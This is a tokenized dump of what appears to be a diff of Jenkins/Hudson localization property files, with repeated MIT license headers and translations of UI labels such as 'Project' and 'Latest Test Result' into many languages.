"notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Latest", "\\", "Test", "\\", "Result", "=", "Aktuelle", "Testergebnisse", "Project", "=", "Projekt", "@", "@", "-", "1", ",", "25", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "Proyecto", "Latest", "\\", "Test", "\\", "Result", "=", "Ultimo", "resultado", "de", "pruebas", "Project", "\\", "name", "=", "Nombre", "de", "proyecto", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "Projekti", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Eric", "Lefevre", "-", "Ardant", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Latest", "\\", "Test", "\\", "Result", "=", "Derniers", "r", "\\", "u00e9sultats", "de", "test", "Project", "=", "projet", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Disable", "\\", "Project", "=", "\\", "u05D7", "\\", "u05E1", "\\", "u05D5", "\\", "u05DD", "\\", "u05E4", "\\", "u05E8", "\\", "u05D5", "\\", "u05D9", "\\", "u05D9", "\\", "u05E7", "\\", "u05D8", "Project", "=", "\\", "u05E4", "\\", "u05E8", "\\", "u05D5", "\\", "u05D9", "\\", "u05D9", "\\", "u05E7", "\\", "u05D8", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Latest", "\\", "Test", "\\", "Result", "=", "Legut", "\\", "u00F3bbi", "teszteredm", "\\", "u00E9nyek", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "Progetto", "@", "@", "-", "1", ",", "25", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2012", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", ",", "Seiji", "Sogabe", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "\\", "u30d7", "\\", "u30ed", "\\", "u30b8", "\\", "u30a7", "\\", "u30af", "\\", "u30c8", "Project", "\\", "name", "=", "\\", "u30d7", "\\", "u30ed", "\\", "u30b8", "\\", "u30a7", "\\", "u30af", "\\", "u30c8", "\\", "u540d", "Latest", "\\", "Test", "\\", "Result", "=", "\\", "u6700", "\\", "u65b0", "\\", "u306e", "\\", "u30c6", "\\", "u30b9", "\\", "u30c8", "\\", "u7d50", "\\", "u679c", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Disable", "\\", "Project", "=", "\\", "uD504", "\\", "uB85C", "\\", "uC81D", "\\", "uD2B8", "\\", "uBE44", "\\", "uD65C", "\\", "uC131", "\\", "uD654", "Project", "=", "\\", "uD504", "\\", "uB85C", "\\", "uC81D", "\\", "uD2B8", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "sorokh", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "Project", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "Projekt", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "\\", "name", "=", "Nome", "do", "projeto", "Latest", "\\", "Test", "\\", "Result", "=", "\\", "u00daltimo", "resultado", "de", "teste", "Project", "=", "Projeto", "@", "@", "-", "1", ",", "25", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Reginaldo", "L", ".", "Russinholi", ",", "Cleiber", "Silva", ",", "Fernando", "Boaglio", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Disable", "\\", "Project", "=", "Desabilitar", "projeto", "Latest", "\\", "Test", "\\", "Result", "=", "\\", "u00DAltimo", "resultado", "do", "teste", "Project", "=", "Projeto", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Disable", "\\", "Project", "=", "Dezactiveaza", "Proiect", "Project", "=", "Proiect", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Mike", "Salnikov", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "\\", "u041f", "\\", "u0440", "\\", "u043e", "\\", "u0435", "\\", "u043a", "\\", "u0442", "Project", "\\", "name", "=", "\\", "u0418", "\\", "u043c", "\\", "u044f", "\\", "u043f", "\\", "u0440", "\\", "u043e", "\\", "u0435", "\\", "u043a", "\\", "u0442", "\\", "u0430", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Disable", "\\", "Project", "=", "Deaktivera", "projekt", "Project", "=", "Projekt", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Oguz", "Dag", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "Proje", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Project", "=", "\\", "u041F", "\\", "u0440", "\\", "u043E", "\\", "u0435", "\\", "u043A", "\\", "u0442", "Project", "\\", "name", "=", "\\", "u041D", "\\", "u0430", "\\", "u0437", "\\", "u0432", "\\", "u0430", "\\", "u043F", "\\", "u0440", "\\", "u043E", "\\", "u0435", "\\", "u043A", "\\", "u0442", "\\", "u0443", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", 